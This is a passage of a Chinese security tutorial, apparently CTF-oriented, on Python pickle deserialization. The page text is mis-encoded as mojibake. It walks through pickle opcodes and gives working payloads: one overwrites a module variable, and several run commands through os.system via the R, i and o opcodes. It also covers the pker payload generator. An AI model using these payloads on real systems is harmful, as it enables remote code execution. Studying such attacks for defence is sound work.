ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td><td>æ— </td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td><td>æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td><td>æ— </td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td><td>æ— </td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td><td>æ— </td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td><td>æ— </td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td><td>å¯¹è±¡è¢«å‚¨å­˜</td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td><td>æ— </td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td>æ— </td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td><td>æ— </td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td><td>æ— </td></tr></tbody></table><p>æ­¤å¤–ï¼Œ <code>TRUE</code> å¯ä»¥ç”¨ <code>I</code> è¡¨ç¤ºï¼š <code>b&#39;I01\n&#39;</code> ï¼› <code>FALSE</code> ä¹Ÿå¯ä»¥ç”¨ <code>I</code> è¡¨ç¤ºï¼š <code>b&#39;I00\n&#39;</code> ï¼Œå…¶ä»–opcodeå¯ä»¥åœ¨<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickleåº“çš„æºä»£ç </a>ä¸­æ‰¾åˆ°ã€‚</p><p>ç”¨è¿™äº›opcodeæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p><ul><li>ç¼–å†™opcodeæ—¶è¦æƒ³è±¡æ ˆä¸­çš„æ•°æ®ï¼Œä»¥æ­£ç¡®ä½¿ç”¨æ¯ç§opcodeã€‚</li><li>åœ¨ç†è§£æ—¶æ³¨æ„ä¸pythonæœ¬èº«çš„æ“ä½œå¯¹ç…§ï¼ˆæ¯”å¦‚pythonåˆ—è¡¨çš„<code>append</code>å¯¹åº”<code>a</code>ã€<code>extend</code>å¯¹åº”<code>e</code>ï¼›å­—å…¸çš„<code>update</code>å¯¹åº”<code>u</code>ï¼‰ã€‚</li><li><code>c</code>æ“ä½œç¬¦ä¼šå°è¯•<code>import</code>åº“ï¼Œæ‰€ä»¥åœ¨<code>pickle.loads</code>æ—¶ä¸éœ€è¦æ¼æ´ä»£ç ä¸­å…ˆå¼•å…¥ç³»ç»Ÿåº“ã€‚</li><li>pickleä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚pickleèƒ½å¤Ÿç´¢å¼•æŸ¥å€¼çš„æ“ä½œåªæœ‰<code>c</code>ã€<code>i</code>ã€‚è€Œå¦‚ä½•æŸ¥å€¼ä¹Ÿæ˜¯CTFçš„ä¸€ä¸ªé‡è¦è€ƒç‚¹ã€‚</li><li><code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦å¯ä»¥æ„é€ å¹¶èµ‹å€¼åŸæ¥æ²¡æœ‰çš„å±æ€§ã€é”®å€¼å¯¹ã€‚</li></ul><h4 id="æ‹¼æ¥opcode"><a href="#æ‹¼æ¥opcode" class="headerlink" title="æ‹¼æ¥opcode"></a>æ‹¼æ¥opcode</h4><p>å°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„ <code>.</code> å»æ‰ï¼Œå°†ç¬¬äºŒä¸ªpickleæµä¸ç¬¬ä¸€ä¸ªæ‹¼æ¥èµ·æ¥å³å¯ã€‚</p><h4 id="å…¨å±€å˜é‡è¦†ç›–"><a href="#å…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="å…¨å±€å˜é‡è¦†ç›–"></a>å…¨å±€å˜é‡è¦†ç›–</h4><p>pythonæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure><p>è¿™æ®µå­—èŠ‚ç çš„å«ä¹‰æ˜¯ï¼š</p><ol><li><code>c__main__\nsecret\n</code>ï¼š<ul><li>ä» <code>__main__</code> æ¨¡å—ä¸­è·å– <code>secret</code> å¯¹è±¡ã€‚</li></ul></li><li><code>(S&#39;name&#39;\nS&#39;1&#39;\ndb.</code>ï¼š<ul><li>åˆ›å»ºä¸€ä¸ªå­—å…¸ <code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™ <code>secret</code> å¯¹è±¡çš„ <code>__dict__</code> å±æ€§ã€‚</li></ul></li></ol><p>ä½¿ç”¨åˆ°çš„payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="å‡½æ•°æ‰§è¡Œ"><a href="#å‡½æ•°æ‰§è¡Œ" class="headerlink" title="å‡½æ•°æ‰§è¡Œ"></a>å‡½æ•°æ‰§è¡Œ</h4><p>ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„opcodeæœ‰ä¸‰ä¸ªï¼š <code>R</code> ã€ <code>i</code> ã€ <code>o</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ„é€ ï¼š</p><ol><li><code>R</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cosï¼š</span><br><span class="hljs-string">ä» os æ¨¡å—ä¸­è·å– system å‡½æ•°ã€‚</span><br><span class="hljs-string">systemï¼š</span><br><span class="hljs-string">è°ƒç”¨ os.system å‡½æ•°ã€‚</span><br><span class="hljs-string">(S&#x27;whoami&#x27;ï¼š</span><br><span class="hljs-string">å°†å­—ç¬¦ä¸² &#x27;whoami&#x27; ä½œä¸ºå‚æ•°ä¼ é€’ç»™ os.systemã€‚</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>i</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>\nios\nsystem\n.ï¼š<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>ï¼šè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå€¼ä¸º <span class="hljs-string">&#x27;whoami&#x27;</span>ã€‚<br>ios å’Œ systemï¼šæŒ‡å‘ Python æ¨¡å— os çš„ system æ–¹æ³•ã€‚<br>.ï¼šè¡¨ç¤ºåºåˆ—åŒ–ç»“æŸ<br></code></pre></td></tr></table></figure><ol start="3"><li><code>o</code> ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>(cos\nsystem\nS<span class="hljs-string">&#x27;whoami&#x27;</span>\no.ï¼š<br>cï¼šè¡¨ç¤ºå¼•ç”¨ä¸€ä¸ªæ¨¡å—ã€‚<br>osï¼šè¡¨ç¤ºå¯¼å…¥çš„æ¨¡å—æ˜¯ Python çš„æ ‡å‡†åº“ osã€‚<br>systemï¼šå¼•ç”¨äº† os æ¨¡å—ä¸­çš„ system æ–¹æ³•ã€‚<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>ï¼šåºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸º <span class="hljs-string">&#x27;whoami&#x27;</span>ã€‚<br>oï¼šè¡¨ç¤ºè°ƒç”¨ï¼ˆå¯¹è±¡åº”ç”¨ï¼‰ï¼Œå°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™ os.system æ–¹æ³•ã€‚<br>.ï¼šè¡¨ç¤ºåºåˆ—åŒ–ç»“æŸã€‚<br></code></pre></td></tr></table></figure><h4 id="å®ä¾‹åŒ–å¯¹è±¡"><a href="#å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡"></a>å®ä¾‹åŒ–å¯¹è±¡</h4><p>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼Œè¿™é‡Œç®€å•çš„ä½¿ç”¨ <code>R</code> æ„é€ ä¸€ä¸‹ï¼Œå…¶ä»–æ–¹å¼ç±»ä¼¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br><span class="hljs-comment">#åˆ›å»ºäº†studentå¯¹è±¡</span><br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li>pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚</a></li><li>ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚</li><li>å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚</li></ul><h2 id="pkerèƒ½åšçš„äº‹"><a href="#pkerèƒ½åšçš„äº‹" class="headerlink" title="pkerèƒ½åšçš„äº‹"></a>pkerèƒ½åšçš„äº‹</h2><blockquote><ul><li>å˜é‡èµ‹å€¼ï¼šå­˜åˆ°memoä¸­ï¼Œä¿å­˜memoä¸‹æ ‡å’Œå˜é‡åå³å¯</li><li>å‡½æ•°è°ƒç”¨</li><li>ç±»å‹å­—é¢é‡æ„é€ </li><li>listå’Œdictæˆå‘˜ä¿®æ”¹</li><li>å¯¹è±¡æˆå‘˜å˜é‡ä¿®æ”¹</li></ul></blockquote><p>å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"><a href="#ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"></a>ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹</h2><ol><li>pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡</li><li>æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚</li><li>pkerä¸»è¦ç”¨åˆ°<code>GLOBALã€INSTã€OBJ</code>ä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä»¥ä¸‹<span class="hljs-keyword">module</span>éƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­<span class="hljs-keyword">module</span><br>è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´<br>å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·<br><br><span class="hljs-keyword">GLOBAL</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;c&#x27;</span><br>è·å–<span class="hljs-keyword">module</span>ä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,instance(callableã€<span class="hljs-keyword">module</span>éƒ½æ˜¯instance)  <br><br>INST<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;i&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;o&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>è¾“å…¥ï¼šcallable,para<br><br>xxx(xx,...)<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;R&#x27;</span><br>ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>æˆ–<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;s&#x27;</span><br>æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;b&#x27;</span><br>å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®<br><br><span class="hljs-keyword">return</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;0&#x27;</span><br>å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š<br><span class="hljs-keyword">return</span> xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ol><li>ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚</li><li>pkerè§£æ<code>S</code>æ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>è¢«è§£æä¸ºï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"><a href="#pkerï¼šå…¨å±€å˜é‡è¦†ç›–" class="headerlink" 